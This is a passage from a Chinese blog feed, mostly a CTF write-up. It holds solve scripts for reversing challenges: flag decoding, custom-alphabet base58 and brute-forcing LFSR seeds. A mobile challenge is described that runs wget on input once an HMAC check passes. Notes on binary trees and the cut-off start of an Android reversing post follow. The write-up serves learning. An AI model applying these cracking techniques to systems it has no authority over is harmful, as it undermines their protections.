python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-number">144</span>, <span class="hljs-number">332</span>, <span class="hljs-number">28</span>, <span class="hljs-number">240</span>, <span class="hljs-number">132</span>, <span class="hljs-number">60</span>, <span class="hljs-number">24</span>, <span class="hljs-number">64</span>, <span class="hljs-number">64</span>, <span class="hljs-number">240</span>, <span class="hljs-number">208</span>, <span class="hljs-number">88</span>, <span class="hljs-number">44</span>, <span class="hljs-number">8</span>, <span class="hljs-number">52</span>, <span class="hljs-number">240</span>, <span class="hljs-number">276</span>, <span class="hljs-number">240</span>, <span class="hljs-number">128</span>, <span class="hljs-number">44</span>, <span class="hljs-number">40</span>, <span class="hljs-number">52</span>, <span class="hljs-number">8</span>, <span class="hljs-number">240</span>, <span class="hljs-number">144</span>, <span class="hljs-number">68</span>, <span class="hljs-number">48</span>, <span class="hljs-number">80</span>, <span class="hljs-number">92</span>, <span class="hljs-number">44</span>, <span class="hljs-number">264</span>, <span class="hljs-number">240</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>    flag += <span class="hljs-built_in">chr</span>((s[i] &gt;&gt; <span class="hljs-number">2</span>) ^ <span class="hljs-number">0x63</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span> % flag)<br></code></pre></td></tr></table></figure><p>flag{G0d_Bless_Wuhan_&amp;<em>China_Growth!</em>}</p><h2 id="fxck！"><a href="#fxck！" class="headerlink" title="fxck！"></a>fxck！</h2><p>太累了，所以这道题随便看了一下，看到base58特征，直接解码，发现不对，一想其他题都不简单，这个应该也不会这么简单吧，所以就没考虑换表。比完赛看了看，还真是换表解密，我哭了。。。。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200316152415784.png" alt="image-20200316152415784"></p><p>这段是求余，我调了一下，发现不是直接把输入base58加密，还加了点东西，说实话，仔细分析，我没看懂这段伪代码，求得余数和我跑程序求得不一样，自闭了。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200316152611658.png" alt="image-20200316152611658"></p><p>换表和加密，不难。</p><p>然后用了brainfuck代码，第一次遇见，根本不知道是什么东西，但是最后的比较字符串可以直接动调dump出来。因为是复现，也简单学习了一下这个加密。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200316152754240.png" alt="image-20200316152754240"></p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200316152823755.png" alt="image-20200316152823755"></p><p>注释中给出了这个加密的运算符。</p><p>既然又碰到了base58，就熟悉一下吧，go语言写脚本，参考:<a href="https://blog.csdn.net/qq_45828877/article/details/103997621">https://blog.csdn.net/qq_45828877/article/details/103997621</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> base58_table []<span class="hljs-keyword">byte</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(input []<span class="hljs-keyword">byte</span>)</span></span> &#123;<br>bInt := big.NewInt(<span class="hljs-number">0</span>).SetBytes(input)<br>fmt.Printf(<span class="hljs-string">&quot;输入字节的16进制表达:%x\n&quot;</span>, bInt)<br>base := big.NewInt(<span class="hljs-number">58</span>)<br>zero := big.NewInt(<span class="hljs-number">0</span>)<br>mod := &amp;big.Int&#123;&#125;<br><span class="hljs-keyword">var</span> result []<span class="hljs-keyword">byte</span><br><span class="hljs-keyword">for</span> bInt.Cmp(zero) != <span class="hljs-number">0</span> &#123;<br>bInt.DivMod(bInt, base, mod)<br>fmt.Printf(<span class="hljs-string">&quot;%x\n&quot;</span>, mod)<br>result = <span class="hljs-built_in">append</span>(result, base58_table[mod.Int64()])<br>&#125;<br>ReverseByte(result)<br>fmt.Printf(<span class="hljs-string">&quot;base58加密结果:%s\n&quot;</span>, result)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(input []<span class="hljs-keyword">byte</span>)</span></span> &#123;<br>result := big.NewInt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> _, b := <span class="hljs-keyword">range</span> input &#123;<br>index := bytes.IndexByte(base58_table, b)<br>result.Mul(result, big.NewInt(<span class="hljs-number">58</span>))<br>result.Add(result, big.NewInt(<span class="hljs-keyword">int64</span>(index)))<br>&#125;<br>decodeByte := result.Bytes()<br><span class="hljs-keyword">if</span> input[<span class="hljs-number">0</span>] == base58_table[<span class="hljs-number">0</span>] &#123;<br>decodeByte = <span class="hljs-built_in">append</span>([]<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">0x00</span>&#125;, decodeByte...)<br>&#125;<br>fmt.Println(decodeByte)<br>fmt.Printf(<span class="hljs-string">&quot;base58解密结果:%s&quot;</span>, decodeByte)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReverseByte</span><span class="hljs-params">(input []<span class="hljs-keyword">byte</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> i, j := <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input)<span class="hljs-number">-1</span>; i &lt; j; i, j = i+<span class="hljs-number">1</span>, j<span class="hljs-number">-1</span> &#123;<br>input[i], input[j] = input[j], input[i]<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>base58_table = []<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&quot;</span>)<br>Encrypt([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;\x06&quot;</span> + <span class="hljs-string">&quot;flag&#123;63510cf7-2b80-45e1-a186-21234897e5cd&#125;&quot;</span>))<br>Decrypt([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&quot;</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200316153024371.png" alt="image-20200316153024371"></p><p>跑出来，发现第一个字节是个<code>\x6</code>……..</p><h2 id="clock"><a href="#clock" class="headerlink" title="clock"></a>clock</h2><p>比赛的时候分析出了源码，但是不知道是什么加密，无从下手。</p><p>后得知是LFSR(线性反馈移位寄存器)，可参考：</p><p>LFSR具体参考：</p><p><a href="https://www.anquanke.com/post/id/181811">https://www.anquanke.com/post/id/181811</a></p><p><a href="https://xz.aliyun.com/t/3682">https://xz.aliyun.com/t/3682</a></p><p><a href="https://zhuanlan.zhihu.com/p/33920501">https://zhuanlan.zhihu.com/p/33920501</a></p><p>writeup和脚本参考:</p><p><a href="http://ctf.njupt.edu.cn/382.html#clock">http://ctf.njupt.edu.cn/382.html#clock</a></p><p>贴出逆向的源码(python3)和爆破脚本(go语言)吧。</p><p>程序主要源码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py">v4 = xxx<br>v3 = xxx<br>v2 = xxx<br>result = []<br><span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100000</span>):<br>    v5 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        v7 = v4 &amp; <span class="hljs-number">0x17FA06</span><br>        i = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v7:<br>            i ^= v7 &amp; <span class="hljs-number">1</span><br>            v7 &gt;&gt;= <span class="hljs-number">1</span><br>        v4 = (i ^ <span class="hljs-number">2</span> * v4) &amp; <span class="hljs-number">0x1FFFFF</span><br>        v9 = v3 &amp; <span class="hljs-number">0x2A9A0D</span><br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v9:<br>            j ^= v9 &amp; <span class="hljs-number">1</span><br>            v9 &gt;&gt;= <span class="hljs-number">1</span><br>        v3 = (j ^ <span class="hljs-number">2</span> * v3) &amp; <span class="hljs-number">0x3FFFFF</span><br>        v11 = v2 &amp; <span class="hljs-number">0x5E5E6A</span><br>        k = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v11:<br>            k ^= v11 &amp; <span class="hljs-number">1</span><br>            v11 &gt;&gt;= <span class="hljs-number">1</span><br>        v2 = (k ^ <span class="hljs-number">2</span> * v2) &amp; <span class="hljs-number">0x7FFFFF</span><br>        v13 = <span class="hljs-number">2</span> * v5<br>        v14 = v3<br>        <span class="hljs-keyword">if</span> v4 &amp; <span class="hljs-number">1</span>:<br>            v14 = v2<br>        v5 = v14 &amp; <span class="hljs-number">1</span> ^ v13<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v5))<br>    result.append(v5)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lfsr</span><span class="hljs-params">(R, mask1, mask2 <span class="hljs-keyword">int64</span>, result *[100]<span class="hljs-keyword">uint8</span>, <span class="hljs-built_in">len</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> x := <span class="hljs-number">0</span>; x &lt; <span class="hljs-built_in">len</span>; x++ &#123;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++ &#123;<br>i := R &amp; mask1<br>lastbit := <span class="hljs-keyword">uint8</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i != <span class="hljs-number">0</span> &#123;<br>lastbit ^= <span class="hljs-keyword">uint8</span>(i &amp; <span class="hljs-number">1</span>)<br>i &gt;&gt;= <span class="hljs-number">1</span><br>&#125;<br>R = (R&lt;&lt;<span class="hljs-number">1</span> ^ <span class="hljs-keyword">int64</span>(lastbit)) &amp; mask2<br>result[x] = result[x]&lt;&lt;<span class="hljs-number">1</span> ^ lastbit<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> output = [<span class="hljs-number">100</span>]<span class="hljs-keyword">uint8</span>&#123;<span class="hljs-number">95</span>, <span class="hljs-number">83</span>, <span class="hljs-number">107</span>, <span class="hljs-number">255</span>, <span class="hljs-number">209</span>, <span class="hljs-number">96</span>, <span class="hljs-number">188</span>, <span class="hljs-number">166</span>, <span class="hljs-number">230</span>, <span class="hljs-number">219</span>, <span class="hljs-number">223</span>, <span class="hljs-number">72</span>, <span class="hljs-number">150</span>, <span class="hljs-number">155</span>, <span class="hljs-number">169</span>,<br><span class="hljs-number">138</span>, <span class="hljs-number">126</span>, <span class="hljs-number">0</span>, <span class="hljs-number">91</span>, <span class="hljs-number">20</span>, <span class="hljs-number">19</span>, <span class="hljs-number">109</span>, <span class="hljs-number">82</span>, <span class="hljs-number">12</span>, <span class="hljs-number">249</span>, <span class="hljs-number">91</span>, <span class="hljs-number">39</span>, <span class="hljs-number">107</span>, <span class="hljs-number">104</span>, <span class="hljs-number">55</span>, <span class="hljs-number">207</span>,<br><span class="hljs-number">65</span>, <span class="hljs-number">155</span>, <span class="hljs-number">197</span>, <span class="hljs-number">204</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">22</span>, <span class="hljs-number">83</span>, <span class="hljs-number">208</span>, <span class="hljs-number">215</span>, <span class="hljs-number">13</span>, <span class="hljs-number">254</span>, <span class="hljs-number">14</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">29</span>,<br><span class="hljs-number">42</span>, <span class="hljs-number">161</span>, <span class="hljs-number">92</span>, <span class="hljs-number">2</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">232</span>, <span class="hljs-number">201</span>, <span class="hljs-number">147</span>, <span class="hljs-number">19</span>, <span class="hljs-number">53</span>, <span class="hljs-number">216</span>, <span class="hljs-number">82</span>, <span class="hljs-number">144</span>, <span class="hljs-number">169</span>,<br><span class="hljs-number">34</span>, <span class="hljs-number">193</span>, <span class="hljs-number">106</span>, <span class="hljs-number">0</span>, <span class="hljs-number">253</span>, <span class="hljs-number">224</span>, <span class="hljs-number">7</span>, <span class="hljs-number">46</span>, <span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">226</span>, <span class="hljs-number">127</span>, <span class="hljs-number">164</span>, <span class="hljs-number">162</span>, <span class="hljs-number">54</span>, <span class="hljs-number">98</span>,<br><span class="hljs-number">144</span>, <span class="hljs-number">141</span>, <span class="hljs-number">182</span>, <span class="hljs-number">174</span>, <span class="hljs-number">252</span>, <span class="hljs-number">64</span>, <span class="hljs-number">130</span>, <span class="hljs-number">19</span>, <span class="hljs-number">163</span>, <span class="hljs-number">242</span>, <span class="hljs-number">176</span>, <span class="hljs-number">78</span>, <span class="hljs-number">79</span>, <span class="hljs-number">3</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>,<br><span class="hljs-number">160</span>, <span class="hljs-number">121</span>, <span class="hljs-number">149</span>, <span class="hljs-number">44</span>, <span class="hljs-number">53</span>, <span class="hljs-number">17</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">equalNumSum</span><span class="hljs-params">(rResult *[100]<span class="hljs-keyword">uint8</span>, output [100]<span class="hljs-keyword">uint8</span>, <span class="hljs-built_in">len</span> <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(sum <span class="hljs-keyword">int</span>)</span></span> &#123;<br>sum = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x := <span class="hljs-number">0</span>; x &lt; <span class="hljs-built_in">len</span>; x++ &#123;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++ &#123;<br><span class="hljs-keyword">if</span> (rResult[x] &amp; <span class="hljs-number">1</span>) == (output[x] &amp; <span class="hljs-number">1</span>) &#123;<br>sum++<br>&#125;<br>rResult[x] &gt;&gt;= <span class="hljs-number">1</span><br>output[x] &gt;&gt;= <span class="hljs-number">1</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//fmt.Println(sum)</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">guessR</span><span class="hljs-params">(mask1, mask2 <span class="hljs-keyword">int64</span>, restrict <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int64</span></span> &#123;<br><span class="hljs-keyword">var</span> result = [<span class="hljs-number">100</span>]<span class="hljs-keyword">uint8</span>&#123;&#125;<br><span class="hljs-built_in">len</span> := <span class="hljs-number">100</span><br>maxLen := <span class="hljs-keyword">int64</span>(<span class="hljs-number">1</span> &lt;&lt; restrict)<br>cmpMax := <span class="hljs-number">0</span><br>rr := <span class="hljs-keyword">int64</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> r := <span class="hljs-keyword">int64</span>(<span class="hljs-number">0</span>); r &lt; maxLen; r++ &#123;<br>lfsr(r, mask1, mask2, &amp;result, <span class="hljs-built_in">len</span>)<br>equalNumSum := equalNumSum(&amp;result, output, <span class="hljs-built_in">len</span>)<br><span class="hljs-keyword">if</span> equalNumSum &gt; cmpMax &#123;<br>cmpMax = equalNumSum<br>rr = r<br>fmt.Println(rr, cmpMax)<br>&#125;<br>&#125;<br>fmt.Println(rr, cmpMax)<br><span class="hljs-keyword">return</span> rr<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">brute_r1</span><span class="hljs-params">(r2, r3 [100]<span class="hljs-keyword">uint8</span>)</span> <span class="hljs-title">int64</span></span> &#123;<br><span class="hljs-keyword">var</span> r1 [<span class="hljs-number">100</span>]<span class="hljs-keyword">uint8</span><br><span class="hljs-built_in">len</span> := <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">21</span><br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">uint8</span><br><span class="hljs-keyword">for</span> r := <span class="hljs-number">0</span>; r &lt; <span class="hljs-built_in">len</span>; r++ &#123;<br>lfsr(<span class="hljs-keyword">int64</span>(r), <span class="hljs-number">0x17fa06</span>, <span class="hljs-number">0x1fffff</span>, &amp;r1, <span class="hljs-number">100</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br><span class="hljs-keyword">for</span> k := <span class="hljs-number">7</span>; k &gt;= <span class="hljs-number">0</span>; k-- &#123;<br>s1 := (r1[i] &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>s2 := (r2[i] &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>s3 := (r3[i] &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>z := s2<br><span class="hljs-keyword">if</span> s1 == <span class="hljs-number">1</span> &#123;<br>z = s3<br>&#125;<br>c = c&lt;&lt;<span class="hljs-number">1</span> ^ z<br>&#125;<br><span class="hljs-keyword">if</span> c != output[i] &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">99</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">int64</span>(r)<br>&#125;<br>&#125;<br>fmt.Println(r)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> r2Result = [<span class="hljs-number">100</span>]<span class="hljs-keyword">uint8</span>&#123;&#125;<br><span class="hljs-keyword">var</span> r3Result = [<span class="hljs-number">100</span>]<span class="hljs-keyword">uint8</span>&#123;&#125;<br><span class="hljs-comment">//r2 := guessR(0x2a9a0d, 0x3fffff, 22)   //3324079</span><br><span class="hljs-comment">//r3 := guessR(0x5E5E6A, 0x7fffff, 23) //4958299</span><br>r2 := <span class="hljs-number">3324079</span><br>r3 := <span class="hljs-number">4958299</span><br>lfsr(<span class="hljs-number">3324079</span>, <span class="hljs-number">0x2a9a0d</span>, <span class="hljs-number">0x3fffff</span>, &amp;r2Result, <span class="hljs-number">100</span>)<br>lfsr(<span class="hljs-number">4958299</span>, <span class="hljs-number">0x5E5E6A</span>, <span class="hljs-number">0x7fffff</span>, &amp;r3Result, <span class="hljs-number">100</span>)<br>fmt.Println(r2Result)<br>fmt.Println(r3Result)<br>r1 := brute_r1(r2Result, r3Result)<br>fmt.Printf(<span class="hljs-string">&quot;flag&#123;%x%x%x&#125;&quot;</span>, r1, r2, r3)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h2><p>比赛的时候觉得快出了，但是不会通信就很难受，复现一遍吧。</p><p>扔到JEB里看看。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319114048514.png" alt="image-20200319114048514"></p><p>往一个文件里写了flag，这样的方式创建的文件会在应用的私有目录下。我们安装软件到手机上，使用adb shell查看。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319120728403.png" alt="image-20200319120728403"></p><p>服务端监听8080端口。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319114813854.png" alt="image-20200319114813854"></p><p>通过输入流得的传给它的数据。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319120127116.png" alt="image-20200319120127116"></p><p>还有接收数据的方法。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319120203664.png" alt="image-20200319120203664"></p><p>通过输出流返回一个随机数。然后对输入的数据进行了一些操作。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319120307536.png" alt="image-20200319120307536"></p><p>主要就是checkpayload方法。</p><p><img src="/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/image-20200319120349230.png" alt="image-20200319120349230"></p><p>验证mssage和check，check是随机数作为密钥的HmacSha1加密。</p><p>验证通过即可执行wget message。</p><p>没有环境了，搭了几个小时，还是没有成功。。。。</p>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树</title>
    <link href="/2020/03/10/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2020/03/10/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h3 id="1-二叉树性质"><a href="#1-二叉树性质" class="headerlink" title="1. 二叉树性质"></a>1. 二叉树性质</h3><ul><li>二叉树最多有两个子树。</li><li>二叉树第i层最多有$2^{i-1}$个节点</li><li>深度为k的二叉树至多有$2^k-1$个节点</li><li>对任一二叉树，叶子节点为n0，度为2的节点为n2，则n0=n2+1</li><li>包含n个结点的二叉树的高度至少为$log_2(n+1)$。</li></ul><h3 id="2-二叉树分类"><a href="#2-二叉树分类" class="headerlink" title="2. 二叉树分类"></a>2. 二叉树分类</h3><ul><li>完全二叉树——叶子节点都在最底下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫作完全二叉树。</li><li>满二叉树——叶子节点全都在最底层，除了叶子节点之外，每个节点都有左右两个子节点，这种二叉树就叫作满二叉树，他是一种特殊的完全二叉树。</li><li>平衡二叉树——平衡二叉树又被称为AVL树（区别于AVL算法），它是一棵二叉排序树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。</li></ul><h3 id="3-二叉树的遍历"><a href="#3-二叉树的遍历" class="headerlink" title="3. 二叉树的遍历"></a>3. 二叉树的遍历</h3><ul><li>前序遍历<pre><code class=" mermaid">graph LR结点--&gt;左子树左子树--&gt;右子树</code></pre></li><li>中序遍历  <pre><code class=" mermaid">graph LR左子树--&gt;结点结点--&gt;右子树</code></pre></li><li>后序遍历  <pre><code class=" mermaid">graph LR左子树--&gt;右子树右子树--&gt;结点</code></pre></li><li>层次遍历  <pre><code class=" mermaid">graph LR第一层--&gt;第二层第二层--&gt;...... --&gt;第K层</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向基础</title>
    <link href="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="第一个Android程序"><a href="#第一个Android程序" class="headerlink" title="第一个Android程序"></a>第一个Android程序</h1><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210701223501900.png" alt="image-20210701223501900"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//关键代码</span><br><br>        btn.set<span class="hljs-constructor">OnClickListener(<span class="hljs-params">new</span> View.OnClickListener()</span> &#123;<br>            @Override<br>            public void on<span class="hljs-constructor">Click(View <span class="hljs-params">v</span>)</span> &#123;<br>                String username_hash = md5(edt_username.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span 